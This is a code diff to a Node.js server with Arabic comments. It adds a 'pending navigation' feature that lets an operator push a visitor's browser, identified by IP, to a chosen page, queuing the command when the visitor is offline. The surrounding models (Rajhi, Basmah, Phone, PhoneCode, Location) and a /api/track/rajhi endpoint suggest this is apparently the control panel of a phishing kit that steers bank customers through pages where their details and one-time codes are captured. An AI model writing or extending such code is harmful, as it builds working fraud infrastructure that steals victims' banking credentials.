@@ -192,6 +192,12 @@ const BasmahSchema = new mongoose.Schema(
 );
 const Basmah = mongoose.model("Basmah", BasmahSchema);
 
+const PendingNavSchema = new mongoose.Schema(
+  { ip: { type: String, unique: true, required: true }, page: { type: String, required: true } },
+  { timestamps: true }
+);
+const PendingNav = mongoose.model("PendingNav", PendingNavSchema);
+
 // ─── REST API ROUTES ──────────────────────────────────────────────────────────
 
 const wrap = (fn) => (req, res, next) => fn(req, res, next).catch(next);
@@ -273,6 +279,12 @@ app.post("/api/track/rajhi", wrap(async (req, res) => {
   res.json({ success: true, doc });
 }));
 
+// endpoint يسأله الفرونت عند تحميل الصفحة
+app.get("/api/pending-nav/:ip", wrap(async (req, res) => {
+  const doc = await PendingNav.findOne({ ip: req.params.ip }).lean();
+  res.json({ page: doc ? doc.page : null });
+}));
+
 app.delete("/api/users/:ip", wrap(async (req, res) => {
   const { ip } = req.params;
   await Promise.all([
@@ -287,7 +299,8 @@ app.delete("/api/users/:ip", wrap(async (req, res) => {
     Phone.deleteMany({ ip }),
     PhoneCode.deleteMany({ ip }),
     Rajhi.deleteMany({ ip }),
-      Basmah.deleteMany({ ip }),
+    Basmah.deleteMany({ ip }),
+    PendingNav.deleteMany({ ip }),
     Location.deleteMany({ ip }),
     Flag.deleteMany({ ip }),
   ]);
@@ -356,6 +369,13 @@ io.on("connection", (socket) => {
       );
       socket.data.ip = ip;
       io.emit("locationUpdated", { ip, page });
+
+      // تحقق إذا في طلب انتقال معلق لهذا الـ IP
+      const pending = await PendingNav.findOne({ ip }).lean();
+      if (pending) {
+        socket.emit("navigateTo", { page: pending.page, ip });
+        await PendingNav.deleteOne({ ip });
+      }
     } catch (e) {
       console.error("Location error:", e);
     }
@@ -510,12 +530,33 @@ io.on("connection", (socket) => {
     }
   });
 
-  socket.on("navigateTo", ({ page, ip: targetIp }) => {
+  socket.on("navigateTo", async ({ page, ip: targetIp }) => {
+    // احفظ الطلب في DB دائماً (للحالة اللي المستخدم offline أو ما وصله)
+    try {
+      await PendingNav.findOneAndUpdate(
+        { ip: targetIp },
+        { page },
+        { upsert: true, new: true }
+      );
+    } catch (e) {
+      console.error("PendingNav save error:", e);
+    }
+
+    // حاول ترسل مباشرة لو المستخدم متصل الآن
+    let sent = false;
     io.of("/").sockets.forEach((clientSocket) => {
       if (clientSocket.data.ip === targetIp) {
         clientSocket.emit("navigateTo", { page, ip: targetIp });
+        sent = true;
       }
     });
+
+    // لو أُرسل مباشرة امسح الـ pending فوراً
+    if (sent) {
+      setTimeout(async () => {
+        await PendingNav.deleteOne({ ip: targetIp }).catch(() => {});
+      }, 3000);
+    }
   });
 
   socket.on("toggleFlag", async ({ ip, flag }) => {
